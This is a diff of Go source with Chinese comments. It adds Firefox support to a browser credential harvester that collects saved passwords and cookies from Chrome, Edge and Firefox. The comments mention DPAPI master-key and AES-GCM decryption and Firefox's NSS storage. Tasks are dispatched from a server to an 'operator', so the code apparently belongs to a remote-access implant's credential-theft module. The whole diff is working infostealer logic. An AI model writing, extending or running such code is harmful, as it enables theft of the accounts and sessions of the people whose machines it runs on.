@@ -43,7 +43,7 @@ func browserRoots() []browserTarget {
 	return out
 }
 
-// collectBrowserCredentials 采集指定浏览器（tech: all/chrome/edge）的口令与 Cookie，
+// collectBrowserCredentials 采集指定浏览器（tech: all/chrome/edge/firefox）的口令与 Cookie，
 // 返回制品。单个配置失败只记入 Errors，不影响其它配置 —— 现场常见"Edge 没装、
 // Chrome 主密钥解不开"，整条任务因此失败对操作员毫无帮助。
 func collectBrowserCredentials(tech string) (CollectedBrowserArtifact, error) {
@@ -55,38 +55,52 @@ func collectBrowserCredentials(tech string) (CollectedBrowserArtifact, error) {
 		art.Host = "unknown"
 	}
 
-	// 技术白名单：服务端只下发 all/chrome/edge，客户端也自己守一遍 ——
+	tech = strings.ToLower(strings.TrimSpace(tech))
+
+	// 技术白名单：服务端只下发 all/chrome/edge/firefox，客户端也自己守一遍 ——
 	// 拼错的值若落进下面的过滤逻辑，会表现为"不过滤"，静默采集了两家的数据，
 	// 与操作员的选择不符（行为不可预测比直接报错更糟）。
-	switch strings.ToLower(strings.TrimSpace(tech)) {
-	case "all", "chrome", "edge":
+	switch tech {
+	case "all", "chrome", "edge", "firefox":
 	default:
-		return art, fmt.Errorf("不支持的浏览器技术: %s（可选 all/chrome/edge）", tech)
+		return art, fmt.Errorf("不支持的浏览器技术: %s（可选 all/chrome/edge/firefox）", tech)
 	}
 
-	roots := browserRoots()
-	if strings.EqualFold(tech, "chrome") || strings.EqualFold(tech, "edge") {
-		want := strings.ToLower(tech)
-		filtered := make([]browserTarget, 0, len(roots))
-		for _, r := range roots {
-			if r.name == want {
-				filtered = append(filtered, r)
+	// Chromium 系（chrome / edge）：User Data + DPAPI 主密钥 + AES-GCM。
+	// firefox 不走这条链路（NSS 结构完全不同），见下面的 Firefox 分支。
+	if tech != "firefox" {
+		roots := browserRoots()
+		if tech == "chrome" || tech == "edge" {
+			filtered := make([]browserTarget, 0, len(roots))
+			for _, r := range roots {
+				if r.name == tech {
+					filtered = append(filtered, r)
+				}
+			}
+			roots = filtered
+			// 明确点名了某个浏览器却没有目录：这是操作员的配置错误，直接失败
+			if len(roots) == 0 {
+				return art, fmt.Errorf("未发现可用的 %s 配置目录", tech)
 			}
 		}
-		roots = filtered
-	}
-	if len(roots) == 0 {
-		return art, fmt.Errorf("未发现可用的 Chrome/Edge 配置目录（技术=%s）", tech)
+		for _, target := range roots {
+			profiles, err := collectFromUserDataDir(target)
+			if err != nil {
+				art.Errors = append(art.Errors, fmt.Sprintf("%s: %v", target.name, err))
+				continue
+			}
+			art.Browsers = append(art.Browsers, profiles...)
+		}
 	}
 
-	for _, target := range roots {
-		profiles, err := collectFromUserDataDir(target)
-		if err != nil {
-			art.Errors = append(art.Errors, fmt.Sprintf("%s: %v", target.name, err))
-			continue
-		}
-		art.Browsers = append(art.Browsers, profiles...)
+	// Firefox（NSS）：logins.json 加密、cookies.sqlite 明文。
+	// tech=all 时与 Chromium 并行采集；没装 Firefox 只会往 Errors 里记一条。
+	if tech == "all" || tech == "firefox" {
+		profs, errs := collectFirefoxProfiles()
+		art.Browsers = append(art.Browsers, profs...)
+		art.Errors = append(art.Errors, errs...)
 	}
+
 	if len(art.Browsers) == 0 {
 		return art, fmt.Errorf("所有浏览器配置都采集失败（见 errors）")
 	}
